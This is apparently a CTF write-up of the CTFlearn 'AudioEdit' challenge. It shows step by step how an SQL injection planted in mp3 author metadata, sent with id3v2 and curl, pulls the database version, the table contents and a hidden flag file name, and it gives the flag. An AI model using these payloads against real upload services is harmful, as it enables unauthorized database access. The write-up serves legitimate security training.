# AudioEdit

[AudioEdit](https://web.ctflearn.com/audioedit/) is a **hard** web challenge on CTFlearn. That challenge is about exploiting SQL injection vulnerability in the metadata of an audio file.


## Solution

When we visit the website, we see a simple audio editing tool. We can upload an audio file, and then we can apply some effects to it.

![AudioEdit](https://beeimg.com/images/s28975348663.png)

If we upload a mp3 file, we can see that the author of the music and the title of the song are displayed, which are extracted from the metadata of the file.

So I downloaded an arbitrary mp3 file from that [website](https://cable.ayra.ch/empty/) and edited the metadata using `id3v2` tool.

Install the tool using the following command.

```bash
sudo apt-get install -y id3v2
```

Then I changed the author of the song to `AAAAAAAAAAAAAAAAAAAAAA`.

```bash
id3v2 -a "AAAAAAAAAAAAAAAAAAAAAA" empty.mp3
```

I uploaded the file to the website and I saw that the metadata was changed.

![AudioEdit](https://beeimg.com/images/q94938211903.png)

I inferred that when we upload a file, the server extracts the metadata and stores it in a database. So I tried to upload an mp3 file with a sql injection in the metadata.

```bash
id3v2 -a "AAAAAAAAAAAAAAAAAAAAAA' OR 1=1 --" empty.mp3
```
To speed up the process, we can send the request to the server using `curl` and extract the author of the song from the response.
 
```bash
sarp@IdeaPad:/tmp$ id3v2 -a "aAAAAAAAAAAAAAAAAAAAAAA' OR 1=1 --" empty.mp3 | curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L 

Error inserting into database!
```

The server returned an error message, which means that the sql injection may be successful. 

Assume that the query executed by the server is like this:

```sql
INSERT INTO audios (id, author, title) VALUES (NULL, '$author', '$title');
```

Since it is likely insertion-based SQL injection and reflects the author field, we can try to extract the version of the database management system.

```bash
sarp@IdeaPad:/tmp$ id3v2 -a "$(xxd -l16 -ps /dev/urandom)', VERSION() ) -- -" empty.mp3 |  curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L -s | grep -oP '<h5>Title: <small>\K[^<]+'

5.5.58-0ubuntu0.14.04.1
```
We successfully extracted the version of the database management system. It is MySQL 5.5.58.

The reason why I used `xxd -l16 -ps /dev/urandom` is to generate a random string of length 16 and make the file unique. Otherwise, the server won't accept the same file.

Also, I wrote a grep command to extract title section from the response.

Now, we can extract the name of the database.

```bash
id3v2 -a "$(xxd -l16 -ps /dev/urandom)', DATABASE() ) -- -" empty.mp3 |  curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L -s | grep -oP '<h5>Title: <small>\K[^<]+'

audioedit
```

The name of the database is `audioedit`. Here, I have tried many different payloads to extract the table names and column names. But I couldn't find any useful information. Because we even don't have the read permission on the information_schema database. The payloads I tried are perfectly valid, I know that because I tried them on my local MySQL server.

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='audioedit';
```

This query should return the table names in the `audioedit` database. But it didn't work.


So, there's nothing left to do but to guess the table name and column names.

I tried to extract the flag from the `flag` table but I couldn't find the table name. Then I tried the `audioedit` table and I was successful.

```bash
sarp@IdeaPad:/tmp$ id3v2 -a "$(xxd -l16 -ps /dev/urandom)', (SELECT title FROM audioedit as a LIMIT 1) ) -- -" empty.mp3 |  curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L -s | grep -oP '<h5>Title: <small>\K[^<]+'

flag
```

Seems like we are in the right direction. In the `audioedit` table, there is a column named `title` and the first row contains an entry having the value `flag`.

Keep the payload the same and change the column name to `author`.

```bash
sarp@IdeaPad:/tmp$ id3v2 -a "$(xxd -l16 -ps /dev/urandom)', (SELECT author FROM audioedit as a LIMIT 1) ) -- -" empty.mp3 |  curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L -s | grep -oP '<h5>Title: <small>\K[^<]+'

ABCTF
```

Since the URL is formed like this, we can try to extract the `file` column from the `audioedit` table.

```
https://web.ctflearn.com/audioedit/edit.php?file=6a84c0529f9644a4275d4bd64b5266c584a26755.mp3
```

Here is the command to extract the `file` column.

```bash
sarp@IdeaPad:/tmp$ id3v2 -a "$(xxd -l16 -ps /dev/urandom)', (SELECT file FROM audioedit as a LIMIT 1) ) -- -" empty.mp3  |  curl -X POST -F "audio=@empty.mp3" "https://web.ctflearn.com/audioedit/submit_upload.php"  -L -s | grep -oP '<h5>Title: <small>\K[^<]+'

supersecretflagf1le.mp3
```

Bingo! We found the name of the file that contains the flag. Now we can download the file using the following URL.

```
https://web.ctflearn.com/audioedit/edit.php?file=supersecretflagf1le.mp3
```

![](https://beeimg.com/images/m34194978491.png)

Actually, the challenge was done at this point. However, years have passed since the challenge was published, the site does not work properly. So we couldn't see the spectogram of the audio file. But we can still download the file and listen to it.

```bash
wget https://web.ctflearn.com/audioedit/uploads/supersecretflagf1le.mp3
```

After I did some research and found a repository that the javascript implementation of the spectogram. I forked the repository and made some changes to make it work with the downloaded file.

<img src="https://camo.githubusercontent.com/89f19baf736619559be7fc253f898aa58cc2339558dbab81fbf68c2e0e76f2eb/687474703a2f2f7572747a7572642e6769746875622e696f2f68746d6c2d617564696f2f7374617469632f696d672f73637265656e73686f742e706e67" alt="Spectogram" width="250" height="250">


You can [visit](https://github.com/urtzurd/html-audio) the repository I forked and hosted on GitHub Pages [here](https://sarperfiles.github.io/html-audio/static/)
 

![Spectogram](https://beeimg.com/images/n80186953914.png)

The flag is `ABCTF{m3t4_inj3cti00n}`.

## Conclusion

Huh! That's a lot of work. I hope you enjoyed the challenge as much as I did. If you have any questions, feel free to ask me on [Twitter](https://twitter.com/sarperavci).